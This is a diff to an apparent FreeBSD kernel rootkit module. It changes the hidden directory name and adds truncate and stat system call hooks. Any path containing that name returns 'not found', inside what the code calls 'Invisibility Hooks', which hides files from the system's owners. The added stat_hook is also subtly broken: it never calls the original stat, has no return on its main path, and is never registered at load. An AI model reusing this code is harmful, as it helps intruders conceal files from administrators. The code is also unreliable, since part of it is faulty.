@@ -32,7 +32,7 @@
 
 /* Options */
 #define KERNDEBUG 1
-#define HIDDENDIR "slicer"
+#define HIDDENDIR "5L1C3R"
 
 /* protector implementing function */
 static int protector(struct thread *td, void *syscall_args)
@@ -176,6 +176,32 @@ static int chown_hook(struct thread *td, void *syscall_args)
     /* Otherwise, call the original system call */
     return (sys_chown(td, syscall_args));
 }
+
+/* truncate hook - prevent file truncating */
+static int truncate_hook(struct thread *td, void *syscall_args)
+{
+    struct truncate_args /*{
+        const char *path;
+        off_t length;
+    }*/ *args;
+    args = (struct truncate_args *)syscall_args;
+
+    /* Copy arguments to kernel space */
+    char path[NAME_MAX];
+    size_t copied;
+    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
+        /* Error Copying Path */
+        return (EFAULT);
+    }
+
+    /* Check if the path contains the HIDDENDIR */
+    if(strstr(path, HIDDENDIR)) {
+        return (ENOENT);
+    }
+
+    /* Otherwise, call the original system call */
+    return (sys_truncate(td, syscall_args));
+}
 /*
  * ==================Invisibility Hooks=================
  * open_hook, chdir_hook, getdirentries_hook
@@ -205,6 +231,30 @@ static int open_hook(struct thread *td, void *syscall_args)
 
     /* Otherwise, call the original system call */
     return (sys_open(td, syscall_args));
+}
+
+/* stat hook - Hide file/directory status */
+static int stat_hook(struct thread *td, void *syscall_args)
+{
+    struct stat_args /*{
+        const char *path;
+        struct stat *sb;
+    }*/ *args;
+    args = (struct stat_args *)syscall_args;
+
+    /* Copy arguments to kernel space */
+    char path[NAME_MAX];
+    size_t copied;
+    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
+        /* Error Copying Path */
+        return (EFAULT);
+    }
+
+    /* Check if directory/file to be opened contains HIDDENDIR */
+    if(strstr(path, HIDDENDIR)) {
+        return (ENOENT);
+    }
+
 }
 
 /* chdir hook - prevent directory traversal to the hiddendir */
@@ -342,6 +392,7 @@ static int load(struct module *module, int cmd, void *arg)
             sysent[SYS_rename].sy_call = (sy_call_t *)rename_hook;
             sysent[SYS_chmod].sy_call = (sy_call_t *)chmod_hook;
             sysent[SYS_chown].sy_call = (sy_call_t *)chown_hook;
+            sysent[SYS_truncate].sy_call = (sy_call_t *)truncate_hook;
             break;
         case MOD_UNLOAD:
             #if KERNDEBUG == 1
@@ -355,6 +406,7 @@ static int load(struct module *module, int cmd, void *arg)
             sysent[SYS_rename].sy_call = (sy_call_t *)sys_rename;
             sysent[SYS_chmod].sy_call = (sy_call_t *)sys_chmod;
             sysent[SYS_chown].sy_call = (sy_call_t *)sys_chown;
+            sysent[SYS_truncate].sy_call = (sy_call_t *)sys_truncate;
             break;
         default:
             error = EOPNOTSUPP; /* Operation not supported */
